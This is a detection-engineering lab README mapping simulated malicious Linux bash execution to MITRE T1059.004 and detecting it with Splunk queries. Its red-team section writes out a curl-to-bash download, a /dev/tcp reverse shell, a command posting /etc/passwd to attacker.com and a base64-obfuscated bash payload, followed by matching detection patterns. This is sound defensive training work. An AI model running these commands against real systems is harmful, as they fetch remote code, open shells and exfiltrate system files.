# 🧠 Detection Engineering – Command & Script Execution (MITRE T1059.004)

This project simulates malicious Linux command execution patterns (e.g., piped shell commands, reverse shells, obfuscated base64 payloads) and detects them using log analysis via Splunk.

## 🎯 MITRE ATT&CK Mapping
- **Tactic:** Execution
- **Technique:** T1059.004 – Command and Scripting Interpreter: Bash

## 🧪 Red Team Simulation

Simulated commands executed via Kali on the target Ubuntu VM:

curl http://malicious.com/script.sh | bash
bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
cat /etc/passwd && curl -X POST -d @/etc/passwd http://attacker.com/loot
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
These simulate:

Chained command execution

Reverse shells via bash

Obfuscated payload execution

## 🔎 Blue Team Detection

✔️ Splunk Queries Used

index=* (bash OR bash_history OR auth.log)
("curl" AND "bash") OR ("|" AND "bash") OR ("&&") OR ("base64" AND "bash")

index=* (bash OR syslog OR bash_history)
("/dev/tcp/" OR ">&" OR "0>&1")

index=* source="/home/*/.bash_history"
| table _time, host, user, message
| search message="*curl*" OR message="*bash*" OR message="*|*" OR message="*base64*"

## 📝 Detection Outcome
Suspicious reverse shell syntax detected via /dev/tcp patterns

curl | bash and base64 | bash patterns flagged as high-risk

Chained shell commands (&&) observed in .bash_history

## 🛡️ Logs Used
.bash_history

/var/log/auth.log

/var/log/syslog

## 📸 Screenshots
Kali attack simulation

Bash history entries

Splunk detection results
